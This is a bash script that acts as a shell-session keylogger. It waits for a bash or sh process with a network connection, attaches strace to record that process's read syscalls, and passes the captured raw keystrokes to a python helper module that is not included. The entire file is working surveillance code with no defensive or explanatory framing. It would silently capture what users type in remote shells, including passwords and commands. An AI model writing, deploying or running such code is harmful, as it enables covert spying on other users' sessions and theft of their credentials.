#!/bin/bash
:> keylog.txt
:> rawkey.txt
:> pids.txt
shell_detected=false
while [ "$shell_detected" = false ] ; do	
	lsof -i | grep -w -e 'bash' -e 'sh' | awk '{print $2}'> pids.txt
	if [ -s pids.txt ] ; then
		shell_detected=true
		shell_pid="$(python -c "import rs; rs.getPID();")"
		echo $shell_pid
		sleep 1
	fi
done
sleep 1
strace -p$shell_pid -o rawkey.txt -e trace=read & > /dev/null

process_on="null"
while [ "$process_on" != "" ] ; do
	process_on="$(ps -A | grep $shell_pid)"
	if [ -s rawkey.txt ] ; then
		python -c "import rs; rs.parse_rawkeys();"
	fi
done

echo "DONE"
